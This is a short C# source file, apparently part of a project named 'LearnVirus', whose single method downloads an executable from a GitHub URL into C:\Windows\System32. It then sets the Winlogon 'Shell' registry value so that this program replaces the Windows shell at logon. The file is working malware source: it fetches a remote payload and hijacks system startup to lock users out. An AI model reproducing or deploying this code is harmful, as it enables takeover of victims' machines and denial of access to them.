using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace LearnVirus.Virus
{
    class Lock
    {
        public static void LockLogin()
        {
            //Download viruslogon.exe
            WebClient webClient = new WebClient();
            webClient.DownloadFile("https://raw.githubusercontent.com/f3098jr9fhd87sq89gba8wei/resources/main/Viruslogon.exe", @"c:\Windows\System32\viruslogon.exe");

            RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            rk.SetValue("Shell", "viruslogon.exe", RegistryValueKind.String);
        }
    }
}
